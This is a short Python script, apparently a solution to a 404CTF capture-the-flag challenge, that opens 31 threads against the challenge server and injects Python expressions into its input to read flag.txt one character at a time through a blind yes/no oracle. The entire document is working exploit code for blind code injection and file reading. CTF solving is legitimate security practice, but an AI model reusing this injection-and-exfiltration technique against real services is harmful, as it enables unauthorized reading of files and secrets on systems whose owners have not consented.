import socket
import base64
import threading

datafinale = list(" "*50)
HOST = 'challenge.404ctf.fr'
PORT = 30806
valid = ['=','<','>','&','_','!','?','#','-','"','.',':','@','{','}','(',')','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/','_','*']
i = 0
def getFlagChar(i):
	#try :
	print("start thread ",i)
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((HOST, PORT))
	donnees = client.recv(1024)
	j = 0		
	donnees = b""
	for j in range(len(valid)):
		donnees = b""
		#print(valid[j])
		client.send(("'1' if open('flag.txt', 'r').readline()["+str(i)+"]=='"+valid[j]+"' else '2'\n").encode())
		while(">" not in donnees.decode()):
			donnees += client.recv(1024)
		#print(donnees.decode())
		if("Vous avez choisi : pierre" in donnees.decode()):
			print(valid[j])
			datafinale[i]=valid[j]
	return "1"
	client.close()


threadList = []
nbThread = 31
for i in range(nbThread):
	threadList.append(threading.Thread(target=getFlagChar, args=(i,)))
	threadList[i].start()

for i in range(nbThread):
	threadList[i].join()

print(''.join(datafinale) )